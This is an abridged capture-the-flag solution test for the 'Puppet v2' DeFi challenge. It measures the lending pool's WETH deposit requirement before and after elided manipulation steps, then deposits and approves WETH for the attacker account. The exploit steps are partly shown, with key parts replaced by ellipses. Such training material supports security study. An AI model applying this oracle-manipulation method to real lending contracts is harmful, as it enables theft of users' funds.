...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        const initDepositRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ...
        const afterDepositRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        console.log("After WEI: ", afterDepositRequired.toString())

        await this.weth.connect(attacker).deposit({value: afterDepositRequired})
        
        await this.weth.connect(attacker).approve(this.lendingPool.address, afterDepositRequired)
